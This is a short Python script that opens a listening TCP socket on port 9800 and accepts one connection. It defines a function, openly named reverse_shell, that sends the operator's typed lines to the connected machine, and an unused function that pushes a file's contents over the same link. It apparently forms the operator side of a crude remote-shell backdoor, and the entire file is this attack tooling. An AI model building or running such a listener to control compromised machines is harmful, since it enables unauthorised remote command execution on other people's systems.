import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((socket.gethostname(), 9800))
s.listen(1)
conn, address = s.accept()
print(f'connection from {address} has been established')


def file_transfer(file):
    with open(file, 'rb') as f:
        cont = f.read()
        conn.send(cont)


def reverse_shell():
    while True:
        x = input().encode('utf-8')
        conn.send(x)


reverse_shell()
